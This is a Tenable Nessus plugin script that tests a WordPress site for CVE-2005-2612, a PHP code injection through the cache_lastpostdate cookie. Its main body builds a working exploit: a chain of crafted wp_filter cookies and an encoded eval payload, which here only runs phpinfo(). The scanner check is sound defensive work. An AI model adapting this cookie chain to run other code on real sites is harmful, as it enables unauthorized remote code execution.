#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(19414);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2016/11/02 20:50:26 $");

  script_cve_id("CVE-2005-2612");
  script_bugtraq_id(14533);
  script_osvdb_id(18672);

  script_name(english:"WordPress Cookie 'cache_lastpostdate' Parameter PHP Code Injection");
  script_summary(english:"Checks for cache_lastpostdate parameter PHP code injection vulnerability in WordPress.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a PHP
code injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The installed version of WordPress on the remote host will accept and
execute arbitrary PHP code passed to the 'cache_lastpostdate'
parameter via cookies if PHP's 'register_globals' setting is enabled.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2005/Aug/232");
  script_set_attribute(attribute:"solution", value:"Disable PHP's 'register_globals' setting.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'WordPress cache_lastpostdate Arbitrary Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/08/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/08/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Construct an exploit per PoC.
#
# nb: hardcoding the final value of 'cnv' would save time but not
#     be as understandable.
cmd = "phpinfo();";
code = base64(str:cmd);
for (i=0; i<strlen(code); i++) {
  cnv += string("chr(", ord(code[i]), ").");
}
cnv += string("chr(32)");
str = base64(str:"args[0]=eval(base64_decode(" + cnv + ")).die()&"+"args[1]=x");

set_http_cookie(name: "wp_filter[query_vars][0][0][function]", value: "get_lastpostdate");
set_http_cookie(name: "wp_filter[query_vars][0][0][accepted_args]", value: "0");
set_http_cookie(name: "wp_filter[query_vars][0][1][function]", value: "base64_decode");
set_http_cookie(name: "wp_filter[query_vars][0][1][accepted_args]", value: "1");
set_http_cookie(name: "cache_lastpostmodified[server]", value: "//e");
set_http_cookie(name: "cache_lastpostdate[server]", value: str);
set_http_cookie(name: "wp_filter[query_vars][1][0][function]", value: "parse_str");
set_http_cookie(name: "wp_filter[query_vars][1][0][accepted_args]", value: "1");
set_http_cookie(name: "wp_filter[query_vars][2][0][function]", value: "get_lastpostmodified");
set_http_cookie(name: "wp_filter[query_vars][2][0][accepted_args]", value: "0");
set_http_cookie(name: "wp_filter[query_vars][3][0][function]", value: "preg_replace");
set_http_cookie(name: "wp_filter[query_vars][3][0][accepted_args]", value: "3");

# Try to exploit one of the flaws to run phpinfo().
r = http_send_recv3(method:"GET", item:dir + "/", port:port, exit_on_fail:TRUE);

# There's a problem if it looks like the output of phpinfo().
if ("PHP Version" >< r[2] && "phpinfo()" >< r[2])
{
  security_warning(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
